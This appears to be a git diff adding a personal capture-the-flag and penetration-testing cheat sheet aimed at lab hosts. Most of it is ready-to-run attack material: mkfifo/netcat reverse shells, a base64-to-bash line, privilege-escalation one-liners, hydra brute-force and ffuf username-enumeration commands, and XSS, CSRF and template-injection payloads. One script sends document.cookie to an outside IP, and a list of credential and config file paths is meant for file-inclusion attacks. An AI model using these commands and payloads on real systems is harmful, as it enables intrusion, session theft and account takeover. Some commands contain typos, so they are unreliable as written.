@@ -1,0 +1,101 @@
+## CheatSheat
+Better shell:
+python3 -c "import pty; pty.spawn('/bin/bash')"
+export TERM=xterm
+CTRL + Z
+stty raw -echo;fg
+
+
+Privilage excaltion:
+python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+echo base64== | base64 -d | bash or o/bin/sh  
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 192.168.152.201 8080 > /tmp/f
+
+
+gobuster dir -u  http://10.64.177.64 -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 40 -c “gavel_session=7gbpqsfeaduc8psj5rbpf4ceg3”
+
+
+if IP Blocked use in burp suite IP ROTATE
+burpsuite makro: if an web app gives you a new token every time you want to log in 
+
+
+
+hydra -l admin -P SecLists/Passwords/xato-net-10-million-passwords-1000000.txt 10.10.125.23 -s 85 http-post-form "/app/castle/index.php/login:username=^USER^&password=^PASS^:Invalid username or password."
+
+
+Network Scanning:
+nmap -p- -Fn $target -v -TS --min-rate 500 --max-rtt-timeout 500ms --max-retries 3 --open -oN nmap_ports.txt
+nmap -Pn $target -sV -sC -v T5 --min-rate 1500 -max-rtt-timeout 500ms --max-retries 3
+nmap -T5 -sV $target -- -sC -sV -Pn -oN nmap_full  -> nmap -T5 -sC -sV -Pn 10.129.7.216
+
+Web Content Discovery:
+ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://ppp.bootupctf.net:8096/FUZZ -e .php, .txt, .js -fs 100
+directory-list-1.0.txt
+directory-list-2.3-medium.txt
+directory-list-2.3-small.txt
+common.txt
+
+
+Dns Discovery:
+ffuf -u http://review.thm/ -H "Host: FUZZ.$target" -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 188
+
+
+user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.80.129.241/customers/signup -mr "username already exists"
+
+
+
+Cracking passwords
+hashcat -m <hash_type> -a <attack_mode> hashfile wordlist
+
+Extaract file from PNG:
+steghide extract -sf oneforall.jpg
+
+hexedit ->edit magic bytes
+
+
+find / -name "*.php"
+
+Sitemap.xml
+
+
+
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&password=pas123" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.66.145.193/ -mr "Invalid username or password."
+
+hydra -l deliver11  -P  tokyo.txt 10.66.145.193 http-post-form "/auth.php:username=^USER^&password=^PASS^:F=auth_failed"
+
+<ImG src="http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3" />
+<iframe src="javascript:alert(`xss`)"> 
+<% import os; x = os.popen('find / -type f -name flag.txt').read() %> ${x}
+
+<script>fetch('http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3')</script>
+<script>fetch('http://10.17.31.228:9000/' + document.cookie)</script>
+
+
+The Poison Null Byte will now look like this: %2500. Adding this and then a .md to the end will bypass the 403 error!
+
+
+rm -f /tmp/p
+mkfifo /tmp/p
+cat /tmp/p | /bin/sh 2>&1 | nc 192.168.152.201 9999 > /tmp/p
+
+
+
+/etc/apache2/apache2.conf  -> main Apache config file
+/etc/apache2/sites-enabled/000-default.conf  -> main domain specific config file
+/etc/apache2/sites-enabled/[SUBDOMAIN].conf  -> subdomain specific config file
+/etc/apache2/envvars  -> environment variables used by Apache
+/etc/apache2/.htpasswd  -> stores Apache credentials
+/etc/apache2/.htaccess  -> defines Apache server access control
+/etc/php/[VERSION]/apache2/php.ini  -> PHP config file
+/etc/httpd/conf/httpd.conf  -> additional web server config file
+/var/log/apache2/access.log  -> Apache logs
+/var/log/apache2/error.log  -> Apache logs
+
+/etc/passwd  -> list of active users
+/etc/hosts  -> local DNS file, may expose new subdomains
+/etc/crontab  -> active cronjobs
+/proc/self/environ  -> environment variables used by current process (web server)
+/proc/version  -> Linux kernel info
+
+
